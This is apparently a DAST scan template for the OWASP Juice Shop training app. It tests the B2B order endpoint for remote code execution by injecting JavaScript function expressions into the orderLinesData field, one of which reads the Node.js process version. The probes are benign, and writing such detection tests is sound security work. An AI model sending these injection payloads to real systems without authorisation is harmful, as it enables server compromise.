id: juice-shop-b2b-rce
info:
  name: B2B Order RCE via JavaScript Injection
  author: dast-mvp
  owasp_category: A05:2025
  severity: critical
  description: Tests for Remote Code Execution in B2B order processing
  tags:
    - rce
    - code-injection
    - injection

requests:
  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){return 2+2})()"}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
          - 401
      - type: word
        words:
          - orderNo
          - B2B
        condition: or

  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){var x=1; while(x<10){x++;} return x;})()"}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - orderNo
          - orderLines
        condition: or

  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){return global.process.version})()"}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - 'v[0-9]+\.[0-9]+\.[0-9]+'
          - 'orderNo'
